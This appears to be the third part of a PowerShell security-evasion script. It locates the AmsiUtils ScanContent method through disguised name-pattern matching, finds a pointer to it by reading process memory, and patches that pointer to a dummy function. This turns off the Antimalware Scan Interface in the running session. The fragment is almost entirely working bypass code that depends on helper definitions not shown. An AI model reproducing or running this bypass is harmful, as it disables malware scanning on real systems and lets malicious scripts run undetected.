# Parte 3
$Assemblies = [appdomain]::currentdomain.getassemblies()
$Assemblies |
  ForEach-Object {
    if($_.Location -ne $null){
   	 $split1 = $_.FullName.Split(",")[0]
   	 If($split1.StartsWith('S') -And $split1.EndsWith('n') -And $split1.Length -eq 28) {
   		 $Types = $_.GetTypes()
   	 }
    }
}

$Types |
  ForEach-Object {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('A') -And $_.Name.EndsWith('s') -And $_.Name.Length -eq 9) {
   		 $Methods = $_.GetMethods([System.Reflection.BindingFlags]'Static,NonPublic')
   	 }
    }
}

$Methods |
  ForEach-Object {
    if($_.Name -ne $null){
   	 If($_.Name.StartsWith('S') -And $_.Name.EndsWith('t') -And $_.Name.Length -eq 11) {
  		 $MethodFound = $_
   	 }
    }
}

[IntPtr] $MethodPointer = $MethodFound.MethodHandle.GetFunctionPointer()
[IntPtr] $Handle = [APIs]::GetCurrentProcess()
$dummy = 0
$ApiReturn = $false

:initialloop for($j = $InitialStart; $j -lt $MaxOffset; $j += $NegativeOffset){
    [IntPtr] $MethodPointerToSearch = [Int64] $MethodPointer - $j
    $ReadedMemoryArray = [byte[]]::new($ReadBytes)
    $ApiReturn = [APIs]::ReadProcessMemory($Handle, $MethodPointerToSearch, $ReadedMemoryArray, $ReadBytes,[ref]$dummy)
    for ($i = 0; $i -lt $ReadedMemoryArray.Length; $i += 1) {
   	 $bytes = [byte[]]($ReadedMemoryArray[$i], $ReadedMemoryArray[$i + 1], $ReadedMemoryArray[$i + 2], $ReadedMemoryArray[$i + 3], $ReadedMemoryArray[$i + 4], $ReadedMemoryArray[$i + 5], $ReadedMemoryArray[$i + 6], $ReadedMemoryArray[$i + 7])
   	 [IntPtr] $PointerToCompare = [bitconverter]::ToInt64($bytes,0)
   	 if ($PointerToCompare -eq $funcAddr) {
   		 Write-Host "Found @ $($j) : $($i)!"
   		 [IntPtr] $MemoryToPatch = [Int64] $MethodPointerToSearch + $i
   		 break initialloop
   	 }
    }
}
[IntPtr] $DummyPointer = [APIs].GetMethod('Dummy').MethodHandle.GetFunctionPointer()
$buf = [IntPtr[]] ($DummyPointer)
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $MemoryToPatch, 1)

$FinishDate=Get-Date;
$TimeElapsed = ($FinishDate - $InitialDate).TotalSeconds;
Write-Host "$TimeElapsed seconds"
}
